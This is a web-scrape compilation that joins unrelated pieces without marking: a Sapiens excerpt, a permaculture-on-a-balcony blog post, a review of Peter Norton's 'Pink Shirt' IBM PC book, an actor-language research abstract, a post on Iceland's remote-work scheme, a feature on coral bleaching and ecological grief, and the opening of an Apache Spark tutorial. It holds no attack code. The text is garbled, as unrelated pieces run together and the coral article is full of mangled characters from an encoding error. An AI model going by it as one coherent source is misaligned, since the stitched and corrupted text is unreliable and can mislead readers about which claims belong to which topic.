<p>This discrepancy between evolutionary success and individual suffering is perhaps the most important lesson we can draw from the Agricultural Revolution. When we study the narrative of plants such as wheat and maize, maybe the purely evolutionary perspective makes sense. Yet in the case of animals such as cattle, sheep and Sapiens, each with a complex world of sensations and emotions, we have to consider how evolutionary success translates into individual experience.</p>

  <div itemprop="articleBody">
    <p><img src="https://permapeople.org/blog/assets/permaculture-balcony.jpg" alt="Two potatoes in an Ikea bag"></p>

<p>First of all, thank you for everyone reaching out to me after my last blog post. It sparked many good conversations about permaculture in general and what people want to see on Permapeople specifically. This post is based on feedback I got, where someone reached out and asked: “I am interested in permaculture but only have a balcony!”</p>

<p>The idea of Permapeople is to create a better way to get information about growing your own plants in a <a href="https://medium.com/@designforsustainability/beyond-sustainability-we-are-living-in-the-century-of-regeneration-4f2b116a65d1"><del>sustainable</del>regenerative</a> way. Many people are hesitant because they live in apartments and don’t have access to some growing space.
When I got into permaculture, the available and actionable information was scattered and hard to use. Specific urban growing instructions on balconies or windowsills were almost nonexistent.
This is why I think it is a great idea to write about how you can start with permaculture, even if you only have a balcony.</p>

<p><strong>For this blog post, I used a new attribute in the database. If you <a href="https://permapeople.org/search?Good+for+containers=true">click here</a>, you’ll find all the plants that are great to be grown in a container and are perfect for the urban permaculture gardener.</strong></p>

<p>Permaculture is a design system with a few general principles, which you can use one a balcony too. I reinterpreted a few here and added some beginners’ tips. The goal is to get started, nothing more!</p>

<h3 id="observe-design--plan">Observe, Design &amp; Plan</h3>
<p>Every good project starts with a plan. The very first thing you want to think about is why you actually want to grow stuff: Is it because you want some fresh herbs or maybe you want to watch bees and butterflies on nice and beautiful smelling flowers, or maybe you want to grow for medicinal uses. Ensure you have a rough goal in mind, which will help you decide when designing your balcony.</p>

<p>Observe your balcony and look for light conditions, wind, and other factors, which might be important: Some plants don’t mind wind but need full sun so you can put them in front. Some cannot bear wind but need a lot of warmth, maybe but them in the back next to a wall, which can save heat overnight. Check if you have a drain to collect water or any other way to collect it. Think about how you can do the work you have to, where to get water from, etc.
Keep looking at your plants from day to day and try to understand: Do they need more water or less, more sun or less, or any other problems that may arise.</p>

<h3 id="keep-inputs-low">Keep Inputs Low</h3>
<p>When you can start setting up your baclony, please don’t check at first online all the things you need to buy. Rather check your basement and storage if you have old plastic boxes or anything else you can use to grow plants in. Garden tools can be lend from friends, family, or neighbors for the first time. Soil, compost, and seeds can be obtained from them too. Promise them a share of the yield if everything works out. Lookout for perennialplants, for example <a href="https://permapeople.org/plants/strawberry">Strawberries</a> since you only need to plant them one time. Only buy if you really have to.
Your own time and energy is another input most people forget, but you definitely want to keep it low. Only grow the plants you have the time to take care of and are resilient to a few days of neglect.</p>

<h3 id="chop-drop--only-add-to-the-top">Chop, Drop &amp; Only Add to the Top</h3>
<p>When it comes to the actual task of growing, I think this is the most and simple thing you can do to maintain good soil for your plants: Continuously add a lot of organic matter to the top of your containers.
Use your kitchen scraps, cut them small, and drop them directly on top of the soil. At the end of the season, chop away the old plants, cut them small, and drop them on top. Make sure to only cut away what is coming out of the soil and leave the soil undisturbed. Old roots in the soil are perfect organic matter when decomposing. <a href="https://permapeople.org/plants/tomato">Tomatoes</a> love being grown in the compost of old tomatoes.
Every organic matter you put on top of your containers will decompose by itself. There is no need to maintain a separate compost container.</p>

<h3 id="start-small">Start Small</h3>
<p>Another important thing is that you should start small not to get overwhelmed and drop everything before success. Even if you grow just a few plants initially, the amount of learning and reward will be huge. Go from there, learn from your experience, and extend your growing projects season by season.
It is more important to get any yield than a huge amount of yield at the end of the season, so focus on that!</p>

<h3 id="diversify-and-experiment">Diversify and Experiment</h3>
<p>While starting small is important, don’t only grow one plant and get disappointed when it fails. There can be many reasons why the plant didn’t grow. Remember to observe frequently and reiterate on your design. Start with 2-3 plants you like to eat or look at and see how they go. If you want, you can also try to grow one plant and different varieties and locations on your balcony. Remember: Always keep experimenting and maximize the learning!</p>

<p>I hope this helps a few people getting started with permaculture, even if they just have minimal space to grow in. If you have any questions or suggestions that you want to see in this blog, please reach out to hello at permaculture dot org. I will read and answer every email.

<p>Happy growing 🌱✌️,</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p>Some successful computer books have earned memorable nicknames. There is the “<a href="https://en.wikipedia.org/wiki/The_C_Programming_Language" target="_blank" rel="noopener noreferrer">K&amp;R</a>” book, the “<a href="https://en.wikipedia.org/wiki/Design_Patterns" target="_blank" rel="noopener noreferrer">Gang of Four</a>” book, and, to please generations of <a href="https://mark-gently.tumblr.com/post/154355213324/techieyuckyboy-wizards-dragons-and-dinosaurs" target="_blank" rel="noopener noreferrer">board and role game players</a>, there are also the “<a href="https://mitpress.mit.edu/sites/default/files/sicp/index.html" target="_blank" rel="noopener noreferrer">Wizard Book</a>“, the “<a href="https://en.wikipedia.org/wiki/Dragon_Book_%28computer_science%29" target="_blank" rel="noopener noreferrer">Dragon Book</a>“, and the “<a href="https://www.amazon.in/gp/product/0471694665/" target="_blank" rel="noopener noreferrer">Dinosaur Book</a>“. With a decidedly more corporate look and feel, let us talk today about the “Pink Shirt” book, officially titled “The Peter Norton Programmer’s Guide to the IBM PC.” More corporate, yes, because the PC was after all a business machine coming from a business corporation.</p>
<p>As a reference for our younger readers, many of which might be reading this publication on an IBM PC (nowadays more commonly referred to as Windows PCs,) it is important to mention one historic fact. This very Mr. <a href="https://www.technologizer.com/2014/06/05/where-have-you-gone-peter-norton/" target="_blank" rel="noopener noreferrer">Peter Norton</a>, the one appearing in the cover of the book, is the same that gave his name to famed products such as Norton Antivirus, Norton Commander (which begat a popular <a href="https://midnight-commander.org/" target="_blank" rel="noopener noreferrer">heir</a>,) Norton Utilities (the most ground-breaking of which was undoubedly <code>UNERASE</code>), culminating with the <a href="https://norton.com/" target="_blank" rel="noopener noreferrer">Norton 360</a> suite available at the time of this writing.</p>
<p>The Norton name played a double role in the PC industry of the 1980s: on one side, representing the aforementioned products, which helped millions of IBM PC users in recovering deleted files and preventing virus infections. On the other side, the pre-Twitch, pre-YouTubber, pre-blogger, pre-web influencer, pre-Guy Kawasaki evangelist. The role that nowadays <a href="https://www.hanselman.com/">Scott Hanselman</a>, <a href="https://github.com/kelseyhightower/kubernetes-the-hard-way" target="_blank" rel="noopener noreferrer">Kelsey Hightower</a> and <a href="https://www.swiftbysundell.com/" target="_blank" rel="noopener noreferrer">John Sundell</a> play for .NET, Kubernetes, and Swift, respectively.</p>
<p>Joel Spolsky <a href="https://www.joelonsoftware.com/2002/12/11/lord-palmerston-on-programming/" target="_blank" rel="noopener noreferrer">mentioned</a> the Pink Shirt book (<a href="https://www.joelonsoftware.com/2004/05/05/mike-gunderloys-coder-to-developer/" target="_blank" rel="noopener noreferrer">twice</a>, actually) as one of the major references that shaped his career.</p>
<h2>The IBM PC</h2>
<p>Why, among the huge numbers of different architectures and standards in the market, did the IBM PC, built around the x86 CPU, became synonym with desktop computing? As explained by Norm DeWitt during his guest appearance in the <a href="https://archive.org/details/Profileo1985" target="_blank" rel="noopener noreferrer">March 19th, 1985 episode of The Computer Chronicles</a>, by 1984 IBM had captured 26% of the worldwide PC market.</p>
<p>(By the way, that video includes a demo of <a href="https://en.wikipedia.org/wiki/IBM_TopView" target="_blank" rel="noopener noreferrer">IBM TopView</a>, a series of unfortunate predictions by Mr. DeWitt, a discussion about <a href="https://en.wikipedia.org/wiki/Multiuser_DOS#Concurrent_DOS" target="_blank" rel="noopener noreferrer">Digital Research’s Concurrent DOS</a> by Gary Kildall himself, and a fascinating discussion of the relationship between IBM and other smaller partners in the industry. Totally worth a watch. But I digress.)</p>
<p>Emerson W. Pugh, in his excellent book “<a href="https://mitpress.mit.edu/books/building-ibm" target="_blank" rel="noopener noreferrer">Building IBM</a>” (MIT Press, 1995) dedicates the last few words of the last chapter to this new machine, born in the Boca Raton, Florida IBU (Independent Business Unit).</p>
<blockquote><p>To achieve broad market acceptance, for example, the PC was to have an open rather than proprietary architecture. To reduce development time and costs, the operating system was to be purchased from an independent software firm, and hardware components were to be open for competitive bids from inside and outside the company. (…)<br>
Spurred on by a brilliant advertising campaign that featured Charlie Chaplin’s little tramp, sales of the PC soared beyond all expectations.</p></blockquote>
<p>The introduction of the IBM PC was the defining moment of a whole market. Software vendors such as Microsoft, <a href="https://www.youtube.com/watch?v=uDsU9wyQ5Ks" target="_blank" rel="noopener noreferrer">Software Arts</a>, and Digital Research were all invited to provide software for this new machine. Byte Magazine started its <a href="https://archive.org/details/byte-magazine-1982-01" target="_blank" rel="noopener noreferrer">January 1982 issue</a> with a <a href="https://archive.org/details/byte-magazine-1982-01/page/n37/mode/2up" target="_blank" rel="noopener noreferrer">glowing statement</a>:</p>
<blockquote><p>What microcomputer has color graphics like the Apple II, an 80-column display like the TRS-80 Model II, a redefinable character set like the Atari 800, a 16-bit microprocessor like the Texas Instruments TI 99/4, an expanded memory space like the Apple III, a full-function uppercase and lowercase keyboard like the TRS-80 Model III, and BASIC color graphics like the TRS-80 Color Computer? Answer: the IBM Personal Computer, which is a synthesis of the best the microcomputer industry has offered to date.</p></blockquote>
<p>Of course, not everybody was as enthusiastic at first. Dr. Dobb’s Journal first mentions the IBM PC in a small note in <a href="https://archive.org/details/dr_dobbs_journal_vol_06/page/n477/mode/2up" target="_blank" rel="noopener noreferrer">page 45 of its October 1981 edition</a>, in a rather laconic fashion:</p>
<blockquote><p>Late News From IBM: On August 12th, IBM announced the IBM Personal Computer, a small home machine. It will be sold, IBM announced, through Computerland stores and Sears Business Machines outlets. The machine consists of a console with keyboard, a separate video monitor (which may be a home TV), and cassette and disk units. It uses 5-inch disks (…)</p></blockquote>
<p>The Pink Shirt book covers subjects applicable to the five kinds of IBM PCs available in 1985: The <a href="https://en.wikipedia.org/wiki/IBM_Personal_Computer" target="_blank" rel="noopener noreferrer">5150 PC</a>, the <a href="https://en.wikipedia.org/wiki/IBM_Personal_Computer_XT" target="_blank" rel="noopener noreferrer">5160 XT</a>, the <a href="https://en.wikipedia.org/wiki/IBM_Personal_Computer/AT" target="_blank" rel="noopener noreferrer">5170 AT</a>, the <a href="https://en.wikipedia.org/wiki/IBM_Portable_Personal_Computer" target="_blank" rel="noopener noreferrer">5155 Portable</a>, and what was arguably the first major flop in the PC industry, the <a href="https://en.wikipedia.org/wiki/IBM_PCjr" target="_blank" rel="noopener noreferrer">IBM PCjr</a>.</p>
<p>To give an idea of the type of hardware we are talking about: all of these machines used the Intel 8088 CPU, except for the AT, which used the 80286. None included the 8087 / 80287 “arithmetic coprocessor” (sold separately!) for which the PCjr did not even have a dedicated slot in the motherboard! Let us be clear: the Intel 8088 could only perform integer math, and floating-point operations were executed in software. Gaming on a PC was not going to be a thing until almost a decade later. This is the world this book was born into.</p>
<p>GPUs were not even a science fiction thing back then.</p>
<h2>Highlights</h2>
<p>In many ways, the Pink Shirt book is akin to “<a href="https://en.wikipedia.org/wiki/The_Linux_Programming_Interface" target="_blank" rel="noopener noreferrer">The Linux Programming Interface</a>” by Michael Kerrisk. Of course, instead of Linux syscalls, you get lists of DOS interrupts. But the idea is the same; to be able to write efficient, fast software for this new kind of computer, using the lowest possible interface available in the original PC. (Ironically enough, there is a 1999 book co-written by Peter Norton <a href="https://www.amazon.com/Peter-Nortons-Complete-Guide-Norton/dp/0672315734" target="_blank" rel="noopener noreferrer">about Linux</a>, but we will leave it for a future edition of this magazine.)</p>
<p>Take, for example, the list of DOS interrupts detailed in chapter 16, called “Universal DOS Functions”; there one finds all that is needed to read and write files, command I/O from the keyboard and to peripherals. The book is sprinkled with bits and pieces of the design philosophy used in the creation of the IBM PC, most of them turning around a central theme:</p>
<blockquote><p>The basic philosophy of the PC family is: Let the BIOS do it; don’t mess with direct control.</p></blockquote>
<p>Mr. Norton will stress this notion several times across his text: to build durable, compatible software across all IBM PC clones, always use interrupts, follow IBM’s advice, and do not circumvent this rule.</p>
<p>The Pink Shirt book is aimed at practicioners; its pages are filled with practical bits and pieces of information, from insider tips and tricks, to actual code snippets. Suffice to mention the “actual production code” taken from the Norton Utilities, shown in page 292, aimed at the calculation of weekdays. Or the section about “Terminate-but-Stay-Resident” (interrupt 39) in page 252, allowing a severely crippled DOS architecture to provide users with an experience similar to that of a multitasking system. Or Appendix B, providing a timeless explanation of hexadecimal arithmetic.</p>
<p>Coupled with its deep detail, there is a honest, down-to-earth tone throughout the book. Mr. Norton is not shy of literally saying “I don’t know” when the time comes; for example in page 37, when explaining how a small snippet of BASIC code can… completly lock up a PCjr. A good example of what I called “honestization” in a <a href="https://deprogrammaticaipsum.com/less-evangelization-more-honestization/" target="_blank" rel="noopener noreferrer">previous edition</a> of this magazine.</p>
<p>Last but not least, the Pink Shirt book included two chapters (19 and 20) dedicated to the creation of programs, using the five most important <a href="https://deprogrammaticaipsum.com/category/issue-13/" target="_blank" rel="noopener noreferrer">programming languages</a> available at this point in time: assembly language, interpreted BASIC, compiled BASIC, Pascal, and of course C. A delightful reading for anyone curious about programming languages history.</p>
<h2>Legacy</h2>
<p>Why is the Pink Shirt book still relevant, almost 40 years later? I will let Raymond Chen answer this question with a quote from his classic book “<a href="https://www.pearson.ch/Informatik/Addison-Wesley/EAN/9780321440303/Old-New-Thing-The" target="_blank" rel="noopener noreferrer">The Old New Thing</a>” (Addison-Wesley, 2007)</p>
<blockquote><p>Every company has its own collection of line-of-business (LOB) applications. These are programs that the company uses for its day-to-day business, programs the company simply cannot live without. (…)<br>
If a Windows upgrade breaks a LOB application, it’s game over. No upgrade. (…)<br>
And it happens that a lot of these LOB applications are 16-bit programs. Some are DOS.</p></blockquote>
<p>This book comes from a time when computers filled entire desks, weighted tens of kilos, had noisy fans, and only a few had mice attached to them. Mr. Norton’s thoughts around <a href="https://deprogrammaticaipsum.com/category/issue-19/" target="_blank" rel="noopener noreferrer">portability</a> and architecture are still valid and stand the test of time.</p>
<p>And most surprisingly, most of the assembly code snippets will still work on any standard Windows PC, in a show of <a href="https://deprogrammaticaipsum.com/category/issue-18/" target="_blank" rel="noopener noreferrer">perenniality</a> that is very rare in our industry. Now go, grab that old Pentium PC in your garage, install <a href="http://freedos.org/" target="_blank" rel="noopener noreferrer">FreeDOS</a> on it, and <a href="https://archive.org/details/BorlandTurboPascal4.0" target="_blank" rel="noopener noreferrer">write</a> some apps.</p>

<h3 id="abstract">Abstract</h3>
<p>Context: Actor-based programming languages offer many essential features for developing modern distributed reactive systems. These systems exploit the actor model’s isolation property to fulfill their performance and scalability demands. Unfortunately, the reliance of the model on isolation as its most fundamental property requires programmers to express complex interaction patterns between their actors to be expressed manually in terms of complex combinations of messages sent between the isolated actors.</p>

<p>Inquiry: In the last three decades, several language design proposals have been introduced to reduce the complexity that emerges from describing said interaction and coordination of actors. We argue that none of these proposals is satisfactory in order to express the many complex interaction patterns between actors found in modern reactive distributed systems.</p>

<p>Approach:  We describe seven smart home automation scenarios (in which an actor represents every smart home appliance) to motivate the support by actor languages for five radically different types of message synchronization patterns, which are lacking in modern distributed actor-based languages. Fortunately, these five types of synchronisation patterns have been studied extensively by the Complex Event Processing (CEP) community. Our paper describes how such CEP patterns are elegantly added to an actor-based programming language.</p>

<p>Knowledge: Based on our findings, we propose an extension of the single-message matching paradigm of contemporary actor-based languages in order to support a multiple-message matching way of thinking in the same way as proposed by CEP languages. Our proposal thus enriches the actor-model by ways of declaratively describing complex message combinations to which an actor can respond.</p>

<p>Grounding: We base the problem-statement of the paper on an online poll in the home automation community that has motivated the real need for the CEP-based synchronisation operators between actors proposed in the paper. Furthermore, we implemented a DSL —— called Sparrow —— that supports said operators and we argue quantitatively (in terms of LOC and in terms of a reduction of the concerns that have to be handled by programmers) that the DSL outperforms existing approaches.</p>

<p>Importance: This work aims to provide a set of synchronization operators that help actor-based languages to handle the complex interaction required by modern reactive distributed systems. To the best of our knowledge, our proposal is the first one to add advanced CEP synchronization operators to the —— relatively simplistic single-message based matching —— mechanisms of most actor-based languages.</p>

<p>The Government of Iceland j<a rel="noreferrer noopener" href="https://www.government.is/news/article/2020/10/27/-Foreign-experts-can-work-remotely-in-Iceland/" target="_blank">ust announced that non-EEA (European Economic Area which means all other countries) citizens can bring their work to Iceland for 6 months.</a> This is a major announcement and something a lot of people in Iceland have been asking for since before the pandemic. I am really excited about this announcement as it opens the door for anyone, anywhere in the world to come and work from Iceland. </p>



<p>Coming to my tribe, which is the tribe of founders and those who are helping founders, this broadly includes investors and other stake holders as described by Brad Feld in his book <a rel="noreferrer noopener" href="https://www.amazon.com/Startup-Communities-Building-Entrepreneurial-Ecosystem/dp/1531886035" target="_blank">Startup Communities</a>. The mission of Startup Iceland has always been to build a vibrant startup community and this new announcement by the Government is probably one of the best things that could have happened. There are founders all over the world and they are building ground breaking technologies and companies, I believe a cohort of those founders would want to come and build their companies from Iceland. This enables those founders to try Iceland as a destination.</p>



<p>I have been fortunate to have seen this trend over a decade back and I have been lobbying anyone and everyone who would listen. I am happy to see a number of people worked on it and now this is a reality. In a number of conversations that I have had over the last decade of working with founders and being an investor in Iceland, a lot of Icelanders have asked me, do we have the talent or people to build great companies? My answer has always been YES! if we are able to encourage founders to work on hard and interesting problems then it is inevitable that they will build great companies. I am not saying that this path is easy, all I am saying is that it is simple. The foundation of my investment thesis when I started as an investor in Iceland was that. </p>



<p>If you are founder working on a hard problem using technology reading this then Iceland is now open to you. </p>



<blockquote><p><em>We need to shape our export industry, based on ingenuity and by making it easier for foreign nationals to work from Iceland, we add value, knowledge and connections in Iceland that support our innovation environment.</em></p><cite><em>Þórdís Kolbrún Reykfjörð Gylfadóttir, Minister of Tourism, Industry and Innovation</em></cite></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>A</span>s smoke from the western North American megafires migrated across the Pacific in early September of 2020, Aziz Mulla flew with a small team of scientists to Lanyu, a remote island 40 miles off the southeastern coast of Taiwan. They were responding to reports of a different kind of wildfire. While no flames scorched forests, the hottest Northern Hemisphere summer on record caused dramatic increases in water temperature around the islandâ€™s renowned coral reefs.</p>

<p>Mulla and his team took a small diving boat out to a section of reef they have studied for years. He describes the location as one of the most gorgeous diving sites in the world. That morning the sea was as calm as a lake. Its turquoise waters glistened in the sunlight. In the distance, the steep hills of Lanyu, also known as Orchid Island, were covered in a shaggy emerald.</p>
<p>â€œI remember getting nervous about the dive while on the boat, which isnâ€™t something that usually happens,â€� says Mulla, a coral ecologist at Academia Sinica, Taiwanâ€™s national university, who has made thousands of dives all over the world. From the boat, Mulla says the destruction was obvious. Corals that should have been a palette of bright hues now glistened like bone. The heat had caused them to expel their color- and life-giving symbiotic algae, a phenomenon known as bleaching that can lead to the coralsâ€™ starvation and death.</p>
<p>Having developed an intimate bond with a particular species of coral, <em>Pocillopora verrucosa</em>, Mulla dove immediately to one of the animals for an up-close look. â€œThe tips of its branches were burnt,â€� he says.&nbsp; â€œIt was as if someone had taken a lighter to them.â€�</p>
<p>Lanyuâ€™s reef was bleached to depths as low as 100 feet. The shrimp, other crustaceans, and small fish who usually live on top of coral were noticeably absent. Larger fish like groupers and parrotfish were also eerily scarce. And the damage was not unique to just that section of reef. In fact, so many of Lanyuâ€™s formerly healthy reefs were bleached that a luminous halo had formed around the island.</p>

<p><span>T</span>he term <em>ecological grief</em> is relatively new in the scientific lexicon but the pain and despair it signifies have been heavily felt over the past few decades as climate change and destructive activities have erased ice shelves, forests, cherished species, and even killed humans. A related term is <em>solastalgia, </em>a neologism <a href="https://www.researchgate.net/publication/5820433_Solastalgia_The_Distress_Caused_by_Environmental_Change" target="_blank">coined by environmental philosopher Glenn Albrecht</a> to signify the existential distress caused by ecological destruction. Climate-induced changes cast a particularly dark shadow. Even as we look at beloved, still-intact landscapes and ecosystems, we know what could soon happen to them..&nbsp;</p>
<p>The terms ask us to consider not only the physical toll of climate change on the environment, but to assess how its decline affects our own mental health. Since scientists have a front-row seat, many bear the weight of this grief and anxiety; in response some communities of researchers have set up <a href="https://www.cbsnews.com/news/the-good-grief-network-support-group-helps-to-deal-with-psychological-effects-of-climate-change/" target="_blank">online support groups</a> to share their experiences and find comfort. Because the effects of climate change on corals can happen so quickly, as in the reefs off Lanyu, marine biologists may be especially traumatized.</p>
<p>â€œItâ€™s actually tragic,â€� says Charles Sheppard of the University of Warwick, who has studied coral reefs in the Chagos Archipelago for more than 40 years. â€œOn a dark night, I really grieve. In fact, some other scientists I know have actually shed tears underwater while scuba diving after seeing the rubble caused by a recent heat wave.â€�</p>
<p>The reefs he studies are some of the worldâ€™s finest. Due to their isolation and the territoryâ€™s ban on commercial fishing, Sheppard describes them as Earthâ€™s reef â€œlaboratoryâ€�—as close reefs now get to baseline perfection, that incredibly rare state of being unaffected by human interference. Sheppard recalls how, earlier in his career, he took other scientists diving for the first time in the Archipelago. They gushed about the reefsâ€™ nearly pristine condition, with thousands of species thriving alongside one another in a kaleidoscope of life.&nbsp;</p>
<p>Even so, many reefs in the Chagos Archipelago have been bleached, most recently during back-to-back extreme heat episodes in 2016 and 2017. In his latest paper, â€œ<a href="http://coralreefs.org/wp-content/uploads/2018/12/Reef_Encounter_Jul_2020_lo-res.pdf%252523page=28" target="_blank">Coral wreaths and the rise of phoenix coral</a>,â€�&nbsp;Sheppard describes a vicious feedback loop: not only are there fewer coral larvae, but less habitat for them to colonize. Much of the Archipelagoâ€™s reefs have turned into what he calls â€œliquid sandpaper.â€�&nbsp;â€œMy suggestion with this paper was that weâ€™ve reached a tipping point,â€� Sheppard says. â€œLess and less corals are being produced and they now have less space to settle on. Itâ€™s a slippery path to extinction, really.â€�</p>
<blockquote><strong>â€œ</strong>We can be optimistic, but we also have to be realistic.â€�</blockquote>
<p>Sheppard also grieves for the impact of coral deaths on humans. The people who are â€œgoing to suffer the most are not the tourists,â€� he says. â€œItâ€™s the people who harvest a living day by day and live a hand-to-mouth existence.â€� Nearly half a billion people rely on coral reefs for fish protein, says Sheppard, and climate change will kill many of them.</p>
<p>Nevertheless Sheppard finds ways to stay optimistic and keep moving. â€œI know Iâ€™ll be dead in 30 years,â€� he says, â€œbut I still will go to the doctor now if something is wrong with me. A human doesnâ€™t say, â€˜Well, whatâ€™s the point if Iâ€™m going to die anyway?â€™ Of course not, there are things to do!â€� He advocates for more research on reefs and outreach to the public—and despite his grim forecast, he wrote in that last paper that â€œa recovery is possible again.â€� It will require heat waves to be less extreme than predicted, and perhaps for people to take a hands-on approach to managing the reefs, and even then wonâ€™t be guaranteed, but thereâ€™s still a chance.&nbsp;</p>
<p>Back in Taiwan, Mulla deals with ecological grief primarily through teaching others, including the public but also friends and family, about what is happening to corals. â€œHaving them experience the same empathy I feel, helps a lot,â€� he says, â€œForest fires are extremely easy to see, but coral reefs are hidden below the surface—and most people think theyâ€™re rocks.â€� Education, Mulla believes, is a necessary step to decreasing greenhouse gases in the atmosphere.&nbsp;</p>
<p>Mulla still has hope. He points to a 2016 study, â€œ<a href="https://www.researchgate.net/publication/303980691_Bright_spots_among_the_world's_coral_reefs" target="_blank">Bright spots among the worldâ€™s coral reefs</a>,â€�&nbsp;which described 15 exceptionally vibrant reefs—some in remote, relatively pristine locations, but others flourishing near places where many people live. These reefs may hold lessons for protecting others, even in a rapidly changing world.&nbsp;</p>
<p>Among the bright spots were Taiwanâ€™s reefs, making this summerâ€™s catastrophic bleaching all the more tragic and also a pressing research subject for Mulla and his team, who are hurrying to understand which coral species will return and how they will respond to further warming events. Like Sheppard in the Indian Ocean, Mulla thinks Taiwanâ€™s reefs are reaching a tipping point. â€œIn 2050, I think weâ€™re going to be looking back at 2020 and think we had it pretty good,â€� he says. â€œWill we have coral reefs in 2050? Yes. Will they look the same? Probably not. We can be optimistic, but we also have to be realistic.â€�</p>

<p><span>I</span>tâ€™s difficult to imagine the grief Mulla and Sheppard must feel when witnessing the destruction of reefs theyâ€™ve studied so closely. I can, however, identify with their solastalgia, particularly this summer of 2020,&nbsp;as the West exploded into fires that <a href="https://www.nytimes.com/2020/09/15/us/oregon-fires-california.html" target="_blank">burned 5 million acres </a>and choked half the hemisphere with smoke.</p>
<p>Much of that smoke was the remnants of cherished trees, plants, animals, and fungi in places Iâ€™ve known well. While Iâ€™ve never been scuba diving, I imagine witnessing mass bleaching is like moping past the burn zone of a devastating wildfire, like I did after this yearâ€™s Dome Fire, which burned 43,248 acres in Californiaâ€™s Mojave National Preserve where stood the densest Joshua tree forest in the world. Instead of the bleached slopes of white Mulla described, I saw blackened stands of snags, charred ground cover, and the burnt corrals of a nearby ranch. Another fire this summer took a nearby canyon in my home state of Colorado, and I now breathe the smoke of one still aflame on treasured mountains above Los Angeles.</p>
<p>These forests will not regenerate in our lifetime. Perhaps they wonâ€™t even look the same for our great-great-grandchildren. It is a lot to take in: the worldâ€™s forests and oceans on fire at the same time. I find buoyancy, though, in every expert I interview who has dedicated their life to finding solutions. Itâ€™s proof that there are people who will put themselves on the front lines of environmental trauma to find knowledge that will help our planet and the people who rely upon it.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        
          

<p>It’s been quite some time since my last article, but here is the second one of the Apache Spark serie. For those of you that are new to spark, please refer to the first part of my previous article which introduces the framework and its usages. In this article, I will show how to execute specific code on different partitions of your dataset. The use cases are various as it can be used to fit multiple different ML models on different subsets of data, or generate features that are group-specific, and more.</p>



<p>In this section, we aim to review how Spark is able to perform parallel operations on your dataset. For this purpose, we will first discuss how Spark represents your data and how this representation allows the framework to make the most of parallel computation. We will then review how Spark makes use of your cluster to distribute the data and perform actions on it. Finally, we will briefly go through how Spark organizes your actions and present some guidelines for avoiding OOMs and speed up your code.</p>

<h2 id="data-abstractions">Data abstractions</h2>

<p>Currently, Apache Spark offers three data abstractions, each with its set of pros and cons:</p>
<ul>
  <li><strong>RDDs</strong>: RDDs have been the main data abstraction on Spark since its release. It stands for Resilient Distributed Dataset. Behind these words hides the definition of what makes RDDs special: it is a <strong>resilient</strong>, <strong>partitioned</strong>, <strong>distributed</strong> and <strong>immutable collection of data</strong>.
    <ul>
      <li><strong>Resilient</strong> means that RDDs are able to recover quickly of a failure. This aspect is enforced by the immutability of the data structure (see below).</li>
      <li><strong>Immutable</strong> means that once an RDD is defined, it cannot be modified. Every action on an RDDs yields another RDD. This aspect helps RDDs be more resilient, since if one operation fails, it can revert to the previous created RDDs (to some extent).</li>
      <li><strong>Partitioned</strong>: Spark partitions your data into multiple little groups called partitions which are then distributed accross your cluster’s node. This enables parallelism.</li>
      <li>RDDs are a <strong>collection of data</strong>: quite obvious, but it is important to point that RDDs can represent any Java object that is serializable.</li>
    </ul>
  </li>
  <li><strong>Dataframe</strong>: the dataframe is based upon RDDs and has been introduced a bit later than RDDs, in Spark 1.3, with the purpose to serve for the Spark SQL module. <em>Dataframes</em> are organized into named columns and are quite close to Panda’s dataframes. Spark recommends the use of dataframes for development, but it should be noted that they offer a higher level of abstraction than RDDs and thus, their range of action is less broad. Dataframes, in the context of Spark SQL allow you to perform SQL like queries in order to play on your data.</li>
  <li><strong>Datasets</strong>: they were the latest introduction of Spark, making their grand entering in Spark 1.6. Datasets combine both the advantages of Dataframes and RDDs as one can run SQL like queries on them and also perform functional operations such as <em>mapPartitions</em> (which we will review later).</li>
</ul>

<p>So among these three data abstractions, which one should you use ?</p>

<p>Well it really depends on the level of control you want and the goal you want to achieve. Datasets are regularly a good choice to go with as it allows you to read and parallelize data the same way as RDDs and still want a structured (or semi-structured) representation of your data as Spark automatically infers your data’s representation. Plus, as we see next, Datasets emphasize both RDDs and Dataframes. For instance, a Dataframe is basically only a <em>Dataset[Row]</em><br>
Dataframes should be used if you need a high level of abstraction on your data and don’t want to mess too much with the optimization: Dataframes come with two powerful optimizers named <em>Catalyst</em> and <em>Tungsten</em>. Catalyst for instance takes your code and generates optimized physical and logical query plans. These optimizers delete by themselves useless queries, combine queries that can be executed together, etc… Going deep into these optimizers would be moving away from the subject.
Finally, I personally use RDDs only when I cannot perform my actions using Datasets or Dataframes. RDDs don’t have any optimizers to my knowledge, and can be a hassle managing as they suffer a lot of GC (Garbage Collection) issues (these issues are known to impact Datasets as well, but in a lesser way). <br></p>

<center>
<figure><img src="https://naifmehanna.com/assets/img/data_abstractions_spark.png"><figcaption>Summary of the three data abstractions and how they relate with each other</figcaption></figure>

</center>

<p>The previous picture summarizes how these three data abstractions relate to each others. Note how the Dataset seems to encapsulate both the advantages of RDDs and Dataframes. However, it also encapsulates most of their disadvantages. You can also note the reference to “encoders”: the Dataset API has this concept of <strong>encoders</strong> which can translate between JVM representations towards Spark’s internal binary format. (<a href="https://stackoverflow.com/questions/31508083/difference-between-dataframe-dataset-and-rdd-in-spark">see this SO thread for improved details</a>)</p>

<h2 id="spark-jobs">Spark jobs</h2>

<p>In this section we will rapidly review how Spark constructs its job processes and how they are effectively executed. 
Once Spark interprets and optimizes your code using Catalyst/Tungsten, containing multiple transformations leading to an action, it constructs a DAG, for Directed Acyclic Graph. This is the beginning of the Spark process.</p>

<h3 id="dags-directed-acyclic-graph">DAGs (Directed Acyclic Graph)</h3>

<p>The DAG is a graph that holds track of the operations applied to a RDD. It is a combination of edges and vertices that respectively indicate the operations and the RDDs. The DAG for each action can be seen in the SparkUI and looks this way :</p>
<center>
<figure><img src="https://naifmehanna.com/assets/img/DAG.png"><center><figcaption>DAG in the SparkUI</figcaption></center></figure>

</center>

<p>The DAG is an important scheduling layer in spark, as it converts the logical execution plan (generated by the <strong>Catalyst optimizer</strong>). 
The DAG is built following a series of lookup which (among many) separates the stages based on the transformation type:</p>
<ul>
  <li>A <strong>wide transformation</strong> involving a full shuffle of data accross partitions</li>
  <li>A <strong>narrow transformation</strong> performing map-side operations that do not require a shuffle of data.</li>
</ul>

<p>Once the DAG has performed his lookups, it genereates the <em>physical execution plan</em> containing the different tasks.</p>

